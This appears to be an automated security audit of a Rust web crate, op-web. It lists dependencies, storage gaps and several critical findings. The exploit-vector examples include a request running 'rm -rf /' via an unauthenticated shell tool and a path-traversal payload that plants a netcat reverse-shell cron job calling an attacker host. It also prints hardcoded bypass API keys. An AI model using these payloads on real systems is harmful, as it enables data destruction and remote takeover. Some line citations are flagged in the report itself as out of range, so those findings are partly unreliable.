### 1. Dependencies & Feature Inventory

Based on `crates/op-web/Cargo.toml` and workspace definitions in `Cargo.toml`, the direct dependencies, version constraints, and feature configurations are detailed below.

#### Workspace/Direct Dependencies

*   **op-core** (`workspace = true`)
    *   *Version*: Resolves to `{ path = "crates/op-core" }` (v1.0.0)
    *   *Features*: Default features.
*   **op-chat** (`workspace = true`)
    *   *Version*: Resolves to `{ path = "crates/op-chat" }` (v1.0.0)
    *   *Features*: Default features.
*   **op-llm** (`{ path = "../op-llm" }`)
    *   *Version*: Local path (v1.0.0)
    *   *Features*: Default features.
*   **op-tools** (`{ path = "../op-tools" }`)
    *   *Version*: Local path (v1.0.0)
    *   *Features*: Default features.
*   **op-agents** (`{ path = "../op-agents" }`)
    *   *Version*: Local path (v1.0.0)
    *   *Features*: Default features.
*   **op-state** (`workspace = true`)
    *   *Version*: Resolves to `{ path = "crates/op-state" }` (v1.0.0)
    *   *Features*: Default features.
*   **op-network** (`workspace = true`)
    *   *Version*: Resolves to `{ path = "crates/op-network" }` (v1.0.0)
    *   *Features*: Default features.
*   **op-mcp** (`{ path = "../op-mcp" }`)
    *   *Version*: Local path (v1.0.0)
    *   *Features*: Default features.
*   **op-mcp-aggregator** (`{ path = "../op-mcp-aggregator" }`)
    *   *Version*: Local path (v1.0.0)
    *   *Features*: Default features.
*   **op-state-store** (`{ path = "../op-state-store" }`)
    *   *Version*: Local path (v1.0.0)
    *   *Features*: Default features.
*   **op-identity** (`workspace = true`)
    *   *Version*: Resolves to `{ path = "crates/op-identity" }` (v1.0.0)
    *   *Features*: Default features.
*   **op-introspection** (`workspace = true`)
    *   *Version*: Resolves to `{ path = "crates/op-introspection" }` (v1.0.0)
    *   *Features*: Default features.
*   **op-grpc-bridge** (`{ path = "../op-grpc-bridge" }`)
    *   *Version*: Local path (v1.0.0)
    *   *Features*: Default features.
*   **op-jsonrpc** (`{ path = "../op-jsonrpc" }`)
    *   *Version*: Local path (v1.0.0)
    *   *Features*: Default features.
*   **tower_governor** (`"0.4"`)
    *   *Version*: `v0.4`
    *   *Features*: Default features.
*   **axum** (`workspace = true`, explicit features: `["ws", "macros", "tokio"]`)
    *   *Version*: Resolves to `v0.7`
    *   *Features*: Explicitly enables WebSocket support (`ws`), routing macros (`macros`), and the Tokio integration (`tokio`).
*   **tokio** (`workspace = true`, explicit features: `["full", "signal"]`)
    *   *Version*: Resolves to `v1`
    *   *Features*: Enables the complete runtime suite (`full`) and signal handling integrations (`signal`).
*   **tower** (`workspace = true`)
    *   *Version*: Resolves to `v0.4`
    *   *Features*: Default features.
*   **tower-http** (`workspace = true`, explicit features: `["cors", "fs", "compression-gzip", "trace", "timeout"]`)
    *   *Version*: Resolves to `v0.5`
    *   *Features*: Explicitly enables CORS resource sharing (`cors`), static file serving (`fs`), Gzip compression middleware (`compression-gzip`), HTTP tracing (`trace`), and request timeout management (`timeout`).
*   **hyper** (`workspace = true`)
    *   *Version*: Resolves to `v1.0`
    *   *Features*: Default features.
*   **serde** (`workspace = true`)
    *   *Version*: Resolves to `v1` with `["derive"]` from workspace.
    *   *Features*: Default features.
*   **simd-json** (`workspace = true`)
    *   *Version*: Resolves to `v0.13` with `["serde", "serde_impl"]` from workspace.
    *   *Features*: Default features.
*   **toml** (`workspace = true`)
    *   *Version*: Resolves to `v0.8`
    *   *Features*: Default features.
*   **futures** (`workspace = true`)
    *   *Version*: Resolves to `v0.3`
    *   *Features*: Default features.
*   **async-trait** (`workspace = true`)
    *   *Version*: Resolves to `v0.1`
    *   *Features*: Default features.
*   **tokio-stream** (`workspace = true`, explicit features: `["sync"]`)
    *   *Version*: Resolves to `0.1`
    *   *Features*: Explicitly enables sync wrapper utilities (`sync`).
*   **async-stream** (`"0.3"`)
    *   *Version*: `v0.3`
    *   *Features*: Default features.
*   **uuid** (`workspace = true`, explicit features: `["v4", "serde"]`)
    *   *Version*: Resolves to `v1.6`
    *   *Features*: Explicitly enables random UUID generation (`v4`) and serialization capabilities (`serde`).
*   **chrono** (`workspace = true`, explicit features: `["serde"]`)
    *   *Version*: Resolves to `v0.4`
    *   *Features*: Explicitly enables Serde serialization integrations (`serde`).
*   **tracing** (`workspace = true`)
    *   *Version*: Resolves to `v0.1`
    *   *Features*: Default features.
*   **tracing-subscriber** (`workspace = true`, explicit features: `["env-filter"]`)
    *   *Version*: Resolves to `v0.3` with `["env-filter", "json"]` from workspace.
    *   *Features*: Enables environment variable based log level filtering (`env-filter`).
*   **anyhow** (`workspace = true`)
    *   *Version*: Resolves to `v1`
    *   *Features*: Default features.
*   **thiserror** (`workspace = true`)
    *   *Version*: Resolves to `v1`
    *   *Features*: Default features.
*   **sysinfo** (`"0.30"`)
    *   *Version*: `v0.30`
    *   *Features*: Default features.
*   **gethostname** (`workspace = true`)
    *   *Version*: Resolves to `v0.5`
    *   *Features*: Default features.
*   **lazy_static** (`"1.4"`)
    *   *Version*: `v1.4`
    *   *Features*: Default features.
*   **regex** (`workspace = true`)
    *   *Version*: Resolves to `v1`
    *   *Features*: Default features.
*   **qrcode** (`"0.14"`)
    *   *Version*: `v0.14`
    *   *Features*: Default features.
*   **image** (`version = "0.25"`, `default-features = false`, explicit features: `["png"]`)
    *   *Version*: `v0.25`
    *   *Features*: Disables heavy default imaging dependencies (`default-features = false`) and restricts format support specifically to `["png"]`.
*   **base64** (`"0.22"`)
    *   *Version*: `v0.22`
    *   *Features*: Default features.
*   **lettre** (`version = "0.11"`, explicit features: `["tokio1-native-tls", "builder"]`)
    *   *Version*: `v0.11`
    *   *Features*: Explicitly enables native TLS transport over Tokio 1.x loops (`tokio1-native-tls`) and email message configuration builders (`builder`).
*   **hex** (`workspace = true`)
    *   *Version*: Resolves to `v0.4`
    *   *Features*: Default features.
*   **zbus** (`workspace = true`)
    *   *Version*: Resolves to `v4.0` with `["tokio"]` from workspace.
    *   *Features*: Default features.
*   **ring** (`"0.17"`)
    *   *Version*: `v0.17`
    *   *Features*: Default features.
*   **oauth2** (`"4.4"`)
    *   *Version*: `v4.4`
    *   *Features*: Default features.
*   **reqwest** (`version = "0.11"`, explicit features: `["json"]`)
    *   *Version*: `v0.11` with `["json", "stream"]` from workspace.
    *   *Features*: Explicitly enables JSON payload parsing (`json`).
*   **rust-embed** (`version = "8"`, explicit features: `["compression"]`)
    *   *Version*: `v8`
    *   *Features*: Enables in-binary asset compression using brotli/deflate (`compression`).
*   **axum-embed** (`"0.1"`)
    *   *Version*: `v0.1`
    *   *Features*: Default features.
*   **mime_guess** (`"2"`)
    *   *Version*: Resolves to `v2.0`
    *   *Features*: Default features.
*   **linemux** (`"0.3.0"`)
    *   *Version*: `v0.3.0`
    *   *Features*: Default features.

#### Yanked, Unpinned (*), or CVE-Adjacent Crates

*   `anyhow` (Flagged per instructions: resolves to `v1`).
*   `thiserror` (Flagged per instructions: resolves to `v1`).
*   `tokio` (Flagged per instructions: resolves to `v1` with features `full` and `signal`).
*   `reqwest` (`v0.11` has various historic TLS/webpki CVEs depending on final patch release).
*   `ring` (`v0.17` has standard caret pinning but is adjacent to historic CPU-side timing attack investigations).
*   No unpinned (`*`) dependencies exist.

#### Crate Features

The `[features]` section in `crates/op-web/Cargo.toml` is **none defined**.

---

### 2. Storage Backend Check

| Backend | Found at file:line | Role (KV/Graph/Cache/Queue) |
| :--- | :--- | :--- |
| SQLite (`SqliteStore`) | `crates/op-web/src/state.rs:194` | KV/Relational: Persistent State Audit Log & Job tracking |
| SQLite (`SqliteStore`) | `crates/op-web/src/state.rs:205` | KV/Relational: Fallback In-Memory State store |
| SQLite (`state.db`) | `crates/op-web/src/state.rs:194` | KV/Relational: Physical SQLite DB on local disk |
| CozoDB / sled | Absent | Expected but missing for Cognitive Memory store (`crates/op-web/src/handlers/mcp.rs:164`) |

#### Violations & Architectural Gaps

1.  **Absent Sled/CozoDB Integration**: The `/api/mcp/cognitive/memory` route handlers (`crates/op-web/src/handlers/mcp.rs:159-216`) return hardcoded static JSON payloads containing placeholders and a `TODO: Query actual memory store`. Since the orchestrator (`crates/op-web/src/orchestrator/tools.rs`) relies on special cognitive agents (such as `agent_context_manager`), the complete absence of `op-cozo-store` or a live `cozo` database instance in `op-web` leaves memory retention non-functional in production.

---

### 3. Security & Quality Findings

#### [CRITICAL] Unauthenticated Arbitrary Command Execution and System Compromise
*   **File/Line**: `crates/op-web/src/routes/mod.rs:281`
*   **Description**: The axum application configures the global router to apply `security::ip_security_middleware` as a layer. However, looking at the middleware implementation in `crates/op-web/src/middleware/security.rs:86-118`, it merely parses the incoming request IP, assigns a security `AccessZone` (e.g., `AccessZone::Public` or `AccessZone::TrustedMesh`), and inserts it as a request extension (`request.extensions_mut().insert(zone)`). It **never returns a rejection** (e.g., `StatusCode::UNAUTHORIZED` or `StatusCode::FORBIDDEN`). 
    Because no route-level check on `AccessZone` is performed anywhere within `/api/tool`, `/api/tools/:name/execute`, or `/jsonrpc`, any client on the public internet can send HTTP POST messages to invoke system tools directly.
*   **Exploit Vector**: An attacker on the public internet sends a POST request to `http://<host>:8080/api/tool` containing:
    ```json
    {
      "tool_name": "shell_exec",
      "arguments": {
        "command": "id && rm -rf /"
      }
    }
    ```
    The server processes this request without authorization checks and executes the arbitrary command as the root user.
*   **Remediation**: Update `ip_security_middleware` to actively inspect the derived `AccessZone` and reject requests from unauthorized zones immediately with `403 Forbidden`, or apply route-level guards ensuring only `TrustedMesh` or verified users can reach executable endpoints.

---

#### [CRITICAL] Directory Traversal and Arbitrary File Write via Chat Transcript Handler
*   **File/Line**: `crates/op-web/src/handlers/chat.rs:228`, `crates/op-web/src/handlers/chat.rs:335`
*   **Description**: The `save_transcript_handler` parses a user-controlled `filename` key directly from the incoming JSON payload. It constructs the file path on the system using `format!("/tmp/{}", filename)` and writes the formatted transcript using `tokio::fs::write`. There is no validation or sanitization of the filename to prevent directory traversal markers (`../`).
*   **Exploit Vector**: An attacker makes a POST request to `/api/chat/transcript` with the payload:
    ```json
    {
      "filename": "../../etc/cron.d/malicious_job",
      "messages": [
        {
          "role": "user",
          "content": "* * * * * root /usr/bin/nc -e /bin/sh attacker-ip 4444"
        }
      ]
    }
    ```
    The server translates the path to `/tmp/../../etc/cron.d/malicious_job` which resolves to `/etc/cron.d/malicious_job` and writes the attacker's payload. The system cron daemon will execute the reverse shell within one minute.
*   **Remediation**: Force-sanitize the `filename` variable by stripping out path components, extracting the base name using `Path::file_name`, or reject any input containing slashes (`/`) or dot-dot (`..`) segments.

---

#### [CRITICAL] Hardcoded Backdoor API Keys in Security Middleware
*   **File/Line**: `crates/op-web/src/middleware/security.rs:16`
*   **Description**: The security middleware statically defines a bypass array `BYPASS_API_KEYS` containing raw plaintext keys `"4f8c2b5d-9a1e-4b7c-8d2f-3a6b5c9e4d1f"` and `"test-key-huggingface-2024"`. Any request containing these keys in the `x-api-key`, `Authorization`, or `x-op-mcp-token` headers bypasses all IP checking and is assigned the highest privilege tier (`AccessZone::TrustedMesh`).
*   **Exploit Vector**: An attacker discovers the static key `"4f8c2b5d-9a1e-4b7c-8d2f-3a6b5c9e4d1f"` (which is publicly visible in the source code or binary string extract) and appends `x-api-key: 4f8c2b5d-9a1e-4b7c-8d2f-3a6b5c9e4d1f` to their malicious requests, instantly obtaining full trust.
*   **Remediation**: Completely remove hardcoded credentials from the source code. Retrieve dynamic keys from secure environment variables or a cryptographically signed key registry.

---

#### [CRITICAL] Unauthenticated WireGuard Private Key and Config Exposure
*   **File/Line**: `crates/op-web/src/handlers/privacy.rs:274-297`
*   **Description**: The `/privacy/access` endpoint takes a raw `user_id` query parameter, fetches the matching user profile from the disk-backed database, and renders the unencrypted WireGuard configuration—**including the client's private key (`wg_private_key_encrypted` which is currently stored in plaintext)**—directly into the rendered HTML. This endpoint does not enforce any session token, cookie, or cryptographic handshake verification.
*   **Exploit Vector**: An attacker targets the `/privacy/access?user_id=<UUID>` URL. Since user IDs are standard UUIDs (which may leak in server logs, proxy histories, or error pages), guessing or obtaining a valid UUID allows the attacker to extract the plaintext WireGuard private key and IP configuration of any system user, completely hijacking their VPN tunnel.
*   **Remediation**: Eliminate the display of raw private keys on unauthenticated pages. Generate keys strictly on the client side whenever possible, or enforce standard OAuth2 or verified-token session flows before serving private key data.

---

#### [CRITICAL] Massive Data Leakage via Multi-Tenant Broadcast Loops
*   **File/Line**: `crates/op-web/src/mcp.rs:172` and `crates/op-web/src/handlers/websocket.rs:107`
*   **Description**: 
    1. In `mcp.rs`, the `mcp_message_handler` processes an incoming system command request, converts the execution result to JSON, and sends it to `GLOBAL_BROADCASTER.broadcast(&json)`. This broadcasts the tool execution results to **all** connected SSE sessions on `/mcp/sse`.
    2. In `handlers/websocket.rs`, once a WebSocket chat message finishes execution (which contains system internals, OVS config details, or file content), the handler sends the response to `state_clone.broadcast_tx.send(simd_json::to_string(&response).unwrap())`. This broadcasts the complete transaction to **every** active client connected to the WebSocket `/ws` endpoint.
*   **Exploit Vector**: A low-privilege observer connects to `ws://<host>:8080/ws` or `http://<host>:8080/mcp/sse`. When an administrator runs highly sensitive configuration tasks, OVS edits, or reads files, the entire configuration details and stdout are pushed directly into the observer's terminal session.
*   **Remediation**: Eliminate global broadcast constructs for session-specific operations. Direct all tool results and orchestration events exclusively to the local connection channel that triggered the instruction.

---

#### [HIGH] Widespread Undefined Behavior via Unpadded SIMD JSON Parsing
*   **File/Line**: `crates/op-web/src/groups_admin.rs:46`, `crates/op-web/src/users.rs:136`, `crates/op-web/src/state_manager_client.rs:37`, `crates/op-web/src/orchestrator/parsing.rs:33`, `crates/op-web/src/orchestrator/parsing.rs:85`, `crates/op-web/src/orchestrator/parsing.rs:114`, `crates/op-web/src/orchestrator/parsing.rs:130`
*   **Description**: Throughout the codebase, strings loaded from databases, files, or network streams are parsed using `unsafe { simd_json::from_str(&mut raw) }`. However, the `simd-json` specification explicitly mandates that the underlying byte buffer **must** possess extra padding bytes (at least `simd_json::PADDING`, typically 32/64 bytes) beyond the logical string boundary. This padding ensures that high-speed SIMD vector instructions (which read chunked registers) do not perform out-of-bounds reads or writes. Standard Rust `String` allocations do not guarantee this padding at the boundary.
*   **Impact**: When reading configuration files or parsing network inputs, the SIMD vector registers can read past the allocated page boundaries of the cloned `String`, resulting in segmentation faults, memory corruption, or memory leaks.
*   **Remediation**: Use `simd_json::to_padded_bin` to safely append the required SIMD padding bytes before executing parsing, or switch to the standard `serde_json` parser for files and payloads that are not pre-padded.

---

#### [MEDIUM] Plaintext Storage of Cryptographic Keys in File Store
*   **File/Line**: `crates/op-web/src/handlers/privacy.rs:109-114`
*   **Description**: The user signup flow contains code with the comment: `// Create user (we'll encrypt the private key later, for now just store it)`. The system writes the raw client private key (`keypair.private_key`) directly into the `wg_private_key_encrypted` database field, which is written to `/var/lib/op-dbus/privacy-users.json` in plaintext.
*   **Impact**: Any local file read vulnerability, misconfigured backup, or unauthorized access to the host file system exposes the private keys of all WireGuard client profiles instantly.
*   **Remediation**: Fully implement the planned key encryption, or perform on-device client key generation to ensure that private key components never transit or reside on the web host.

---
## ⚠ Citation Warnings
- `crates/op-web/src/routes/mod.rs:281`: file has 248 lines
